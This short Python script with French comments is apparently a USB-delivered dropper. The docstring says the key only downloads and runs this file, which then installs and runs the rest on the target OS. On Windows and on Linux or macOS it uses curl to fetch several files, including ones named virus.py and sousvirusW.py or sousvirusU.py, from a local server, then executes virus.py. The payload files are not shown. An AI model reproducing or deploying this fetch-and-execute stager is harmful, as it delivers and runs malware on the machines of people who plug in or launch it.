import os
"""
Le but de ce script est de simplifier la clé usb, ainsi la clé a juste a télécharger ce fichier et l'executer et ensuite il s'occupe d'installer et executer le reste en fonction de l'os cible
"""
if os.name == "nt":
    #Si l'os est windows
    os.system("curl -o data.txt http://localhost:8000/data.txt")
    os.system("curl -o compteur.py http://localhost:8000/compteur.py")
    os.system("curl -o popup.py http://localhost:8000/popup.py")
    os.system("curl -o sousvirusW.py http://localhost:8000/sousvirusW.py")
    os.system("curl -o virus.py http://localhost:8000/virus.py")
    os.system("python virus.py")
else:
    #Si c'est linux (ou macos)
    os.system("curl -o 'data.txt' 'http://localhost:8000/data.txt'")
    os.system("curl -o 'compteur.py' 'http://localhost:8000/compteur.py'")
    os.system("curl -o 'popup.py' 'http://localhost:8000/popup.py'")
    os.system("curl -o 'sousvirusU.py' 'http://localhost:8000/sousvirusU.py'")
    os.system("curl -o 'virus.py' 'http://localhost:8000/virus.py'")
    os.system("python3 virus.py")